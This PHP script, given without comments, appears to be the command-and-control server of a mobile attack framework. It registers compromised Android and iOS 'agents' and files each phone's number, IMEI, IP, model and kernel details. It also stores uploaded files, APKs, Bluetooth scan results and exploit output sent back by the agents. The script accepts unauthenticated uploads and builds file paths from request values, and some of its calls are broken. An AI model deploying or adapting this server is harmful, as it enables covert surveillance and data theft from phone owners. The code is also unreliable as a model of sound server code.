<?php
header('Content-Type: text; charset=utf-8');
$agentsfilelocation = "REPLACELOCATION";
$agentfile = "FILEREPLACE";
$agentsfile = $agentsfilelocation . $agentfile;
$delete=$_REQUEST['deleteline'];
$command=$_REQUEST['command'];
$text=$_REQUEST['text'];
if (isset($delete))
{
        $commandfile = file_get_contents('command');
        if(strpos($commandfile, $delete) !== FALSE)
        {
                $commandfile = str_replace($delete . PHP_EOL, '', $commandfile);
                file_put_contents('command', $commandfile);
        }
}
elseif (isset($command))
{
        if (isset($text) || strcmp(trim($pieces[1]),"UPLD") == 0)
        {

            $pieces = explode(" ", $command);
            if (strcmp(trim($pieces[1]),"ATTA") == 0) {
                $pieces2 = explode(",", $text);
                $number = trim($pieces2[1]);
                $firstcharacter = $number[0];
                if (strcmp($firstcharacter,"+") == 0){
                        $number = substr($number,1);
                }
                $mylines = "";
                $fh = fopen($agentsfile,'r+');
                while(!feof($fh)) {
                         $line = fgets($fh);
                         $agentline = explode(' ',$line);
                         if (count($agentline) == 5)
                         {
                                $line2 = trim($line);
                                $line2 .= " " . $number;
                                $line2 .= " active" . PHP_EOL;
                                mkdir($agentsfilelocation . $number, 0770);
                                $myfile = fopen($agentsfilelocation . $number . "/facts.txt", "w");
                                 if (strcmp(trim($pieces2[2]),"iOS") == 0) {
                                        fwrite($myfile,"Type: " . $pieces2[2] . PHP_EOL);
                                }
                                if (strcmp(trim($pieces2[2]),"Android") == 0) {
                                        fwrite($myfile,"Phone Number: " . $pieces2[1] . PHP_EOL);
                                        fwrite($myfile,"Type: " . $pieces2[2] . PHP_EOL);
                                        fwrite($myfile,"SDK Version: " . $pieces2[4] . PHP_EOL);
                                        fwrite($myfile,"IMEI: " . $pieces2[5] . PHP_EOL);
                                        fwrite($myfile,"Wifi IP: " . $pieces2[6] . PHP_EOL);
                                        fwrite($myfile,"Baseband Version: " . $pieces2[7] . PHP_EOL);
                                        fwrite($myfile,"Model: " . $pieces2[8] . PHP_EOL);
                                        fwrite($myfile,"Kernel Version: " . $pieces2[9] . PHP_EOL);
                                }
                                fclose($myfile);
                                chmod($myfile, 0664);
                                $line .=  PHP_EOL;
                                $line .= $line2;
                          }
                          $mylines .= $line;
                }
                file_put_contents($agentsfile, $mylines);
                fclose($fh);
           }
           else if (strcmp(trim($pieces[1]),"APKS") == 0) {
                $mykey = $pieces[0];
                $mynumbers = explode("-",$mykey);
                $sliced = array_slice($mynumbers, 1, count($mynumbers)-1, true);
                $mynumber = implode("-", $sliced);
                $mytext = base64_decode($text);
                $myfile = fopen($agentsfilelocation . $mynumber . "/APKS.txt", "w");
                fwrite($myfile,$mytext);
                fclose($myfile);
                chmod($myfile, 0664);

        }
        else if (strcmp(trim($pieces[1]),"GETS") == 0) {
                $mykey = $pieces[0];
                $mynumbers = explode("-",$mykey);
                $sliced = array_slice($mynumbers, 1, count($mynumbers)-1, true);
                $mynumber = implode("-", $sliced);
                $myfile = fopen($agentsfilelocation . $mynumber . "/Settings.txt", "w");
                fwrite($myfile,$text);
                fclose($myfile);
                chmod($myfile, 0664);

        }
	
	else if (strcmp(trim($pieces[1]),"GBLU") == 0) {
                $mykey = $pieces[0];
                $mynumbers = explode("-",$mykey);
                $sliced = array_slice($mynumbers, 1, count($mynumbers)-1, true);
                $mynumber = implode("-", $sliced);
                $myfile = fopen($agentsfilelocation . $mynumber . "/bluetooth-paired.txt", "w");
                fwrite($myfile,$text);
                fclose($myfile);
                chmod($myfile, 0664);

        }
	
	else if (strcmp(trim($pieces[1]),"SBLU") == 0) {
                $mykey = $pieces[0];
                $mynumbers = explode("-",$mykey);
                $sliced = array_slice($mynumbers, 1, count($mynumbers)-1, true);
                $mynumber = implode("-", $sliced);
                $myfile = fopen($agentsfilelocation . $mynumber . "/bluetooth-scan.txt", "w");
                fwrite($myfile,$text);
                fclose($myfile);
                chmod($myfile, 0664);

        }

        else if (strcmp(trim($pieces[1]),"UPLD") == 0) {
                $uploadfile = trim($pieces[2]);
                $myuploadfile2 = str_replace("/", '-', $uploadfile);
                $myuploadfile = substr($myuploadfile2, 1);
                $mykey = $pieces[0];
                $mynumbers = explode("-",$mykey);
                $sliced = array_slice($mynumbers, 1, count($mynumbers)-1, true);
                $mynumber = implode("-", $sliced);
                $updir = $agentsfilelocation . $mynumber . "/";
                $upfile = $updir.$myuploadfile;
                move_uploaded_file($_FILES['file']['tmp_name'],$upfile);


        }
                else if (strcmp(trim($pieces[1]),"UAPK") == 0) {
                $uploadfile = trim($pieces[2]);
                $myuploadfile = $uploadfile . ".apk";
                $mykey = $pieces[0];
                $mynumbers = explode("-",$mykey);
                $sliced = array_slice($mynumbers, 1, count($mynumbers)-1, true);
                $mynumber = implode("-", $sliced);
                $mytext = base64_decode($text);
                $myfile = fopen($agentsfilelocation . $mynumber . "/" . $myuploadfile, "w");
                fwrite($myfile,$mytext);
                fclose($myfile);
                chmod($myfile, 0664);


        }

        else if (strcmp(trim($pieces[1]),"EXUP") == 0) {
                $lengthpieces = count($pieces);
                $outputfile = "";
                for ($x = 3; $x < $lengthpieces; $x++)
                {
                        $outputfile .= $pieces[$x] . "-";
                }
                $outputfile .= ".txt";
                $mykey = $pieces[0];
                $mynumbers = explode("-",$mykey);
                $sliced = array_slice($mynumbers, 1, count($mynumbers)-1, true);
                $mynumber = implode("-", $sliced);
                $mytext = base64_decode($text);
                $myfile = fopen($agentsfilelocation . $mynumber . "/" . $outputfile, "w");
                fwrite($myfile,$mytext);
                fclose($myfile);
                chmod($myfile, 0664);


        }

   }

}
?>
